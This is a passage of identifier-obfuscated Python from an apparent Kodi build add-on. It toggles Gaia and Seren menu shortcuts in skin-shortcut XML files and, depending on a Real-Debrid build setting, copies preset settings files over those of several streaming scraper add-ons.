    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:555
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:556
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:560
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:561
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:562
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:580
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:583
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:584
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:587
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:588
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:589
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:607
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:610
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:611
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:613
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:614
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:615
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:633
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:636
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:637
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:639
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:640
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:641
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:659
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:662
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:663
    OOOOOO00OO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:666
    with open (OOOOOO00OO00O00O0 ,'r')as O00OO0O0OO0OOOOO0 :#line:667
      OO0O0O0000OOO0000 =O00OO0O0OO0OOOOO0 .read ()#line:668
    OO0O0O0000OOO0000 =OO0O0O0000OOO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:686
    with open (OOOOOO00OO00O00O0 ,'w')as O00OO0O0OO0OOOOO0 :#line:689
      O00OO0O0OO0OOOOO0 .write (OO0O0O0000OOO0000 )#line:690
def rdbuildinstall ():#line:693
  try :#line:694
   O00OOO0O0OO0O0O0O =(ADDON .getSetting ("rdbuild"))#line:695
   if O00OOO0O0OO0O0O0O =='true':#line:696
     OO0OOO0OOOO0O0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:697
     O00OOOO00O0O0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:698
     copyfile (OO0OOO0OOOO0O0O0O ,O00OOOO00O0O0O000 )#line:699
  except :#line:700
     pass #line:701
def rdbuildaddonoff ():#line:704
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:707
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:708
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:709
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:727
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:730
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:731
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:735
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:736
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:737
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:755
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:758
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:759
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:763
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:764
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:765
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:783
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:786
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:787
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:791
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:792
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:793
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:811
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:814
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:815
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:818
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:819
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:820
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:838
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:841
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:842
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:844
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:845
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:846
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:864
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:867
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:868
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:870
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:871
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:872
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:890
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:893
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:894
    OOO000OO000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:897
    with open (OOO000OO000OO0O0O ,'r')as OO00O00000OOOOO0O :#line:898
      OO0O00O0OO0OO00O0 =OO00O00000OOOOO0O .read ()#line:899
    OO0O00O0OO0OO00O0 =OO0O00O0OO0OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:917
    with open (OOO000OO000OO0O0O ,'w')as OO00O00000OOOOO0O :#line:920
      OO00O00000OOOOO0O .write (OO0O00O0OO0OO00O0 )#line:921
def rdbuildinstalloff ():#line:924
    try :#line:925
       O0O0000OOO0O0O000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:926
       OO000O0OO0O000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:927
       copyfile (O0O0000OOO0O0O000 ,OO000O0OO0O000O00 )#line:929
       O0O0000OOO0O0O000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:931
       OO000O0OO0O000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:932
       copyfile (O0O0000OOO0O0O000 ,OO000O0OO0O000O00 )#line:934
       O0O0000OOO0O0O000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:936
       OO000O0OO0O000O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:937
       copyfile (O0O0000OOO0O0O000 ,OO000O0OO0O000O00 )#line:939
       O0O0000OOO0O0O000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:942
       OO000O0OO0O000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:943
       copyfile (O0O0000OOO0O0O000 ,OO000O0OO0O000O00 )#line:945
    except :#line:947
       pass #line:948
def rdbuildaddonON ():#line:955
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:958
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:959
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:977
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:980
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:981
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:985
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:986
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:987
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1005
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1008
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1009
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1014
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1015
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1033
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1036
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1037
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1041
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1042
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1043
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1061
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1064
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1065
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1069
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1070
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1088
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1091
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1092
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1094
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1095
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1096
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1114
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1117
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1118
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1121
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1122
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1140
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1143
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1144
    OO0O0OOOOO00O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1147
    with open (OO0O0OOOOO00O00OO ,'r')as OO0O0OO00OO00O0O0 :#line:1148
      OOOOO0000O0OO00OO =OO0O0OO00OO00O0O0 .read ()#line:1149
    OOOOO0000O0OO00OO =OOOOO0000O0OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1167
    with open (OO0O0OOOOO00O00OO ,'w')as OO0O0OO00OO00O0O0 :#line:1170
      OO0O0OO00OO00O0O0 .write (OOOOO0000O0OO00OO )#line:1171
def rdbuildinstallON ():#line:1174
    try :#line:1176
       O00OOO0O0O000O0O0 =ADDONPATH +"/resources/rd/victory.xml"#line:1177
       OOO0OO0OO0O0O00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1178
       copyfile (O00OOO0O0O000O0O0 ,OOO0OO0OO0O0O00OO )#line:1180
       O00OOO0O0O000O0O0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1182
       OOO0OO0OO0O0O00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1183
       copyfile (O00OOO0O0O000O0O0 ,OOO0OO0OO0O0O00OO )#line:1185
       O00OOO0O0O000O0O0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1187
       OOO0OO0OO0O0O00OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1188
       copyfile (O00OOO0O0O000O0O0 ,OOO0OO0OO0O0O00OO )#line:1190
       O00OOO0O0O000O0O0 =ADDONPATH +"/resources/rd/Splash.png"#line:1193
       OOO0OO0OO0O0O00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1194
       copyfile (O00OOO0O0O000O0O0 ,OOO0OO0OO0O0O00OO )#line:1196
